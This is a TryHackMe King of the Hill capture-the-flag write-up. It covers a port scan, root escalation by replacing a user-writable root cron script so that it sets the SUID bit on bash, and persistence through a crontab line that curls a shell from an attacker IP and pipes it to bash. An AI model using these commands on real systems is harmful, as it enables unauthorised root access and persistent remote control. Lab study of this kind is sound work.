---
title: "H1 Easy"
type: docs
tags:
  - thm
  - koth
  - king-of-the-hill
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **Mode:** King of the Hill

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Port scan, SSH, HTTP, and several high app ports.
2. Foothold on the box (method not recorded in these notes).
3. Privesc: a root `cron` job runs `backup.sh` from a user-writable backup directory, replace it with an attacker-controlled script.
4. Persist with a SUID `bash` and a reverse-shell crontab.

</div>

## Port Scan

```console
Open 10.10.209.148:22
Open 10.10.209.148:80
Open 10.10.209.148:8000
Open 10.10.209.148:8001
Open 10.10.209.148:8002
Open 10.10.209.148:9999
```

![Pasted image 20240108201943](Pasted-image-20240108201943.png)

![Pasted image 20240108202217](Pasted-image-20240108202217.png)

## Privilege Escalation, writable cron script

`backup.sh` runs as **root** from a cron job, and the script lives in our user's backup directory. Rename the original and drop our own `backup.sh` containing the payload below; when the cron fires it runs as root and sets the SUID bit on `bash`.

```bash
# our malicious backup.sh
chmod u+s /bin/bash
```

```bash
# then, as root-equivalent:
/bin/bash -p
```

## Persistence

Set a cron backdoor that pulls and executes a shell every minute:

```bash
(crontab -l ; echo "* * * * * curl http://10.6.55.72:3333/shell | bash") | crontab 2>/dev/null
```
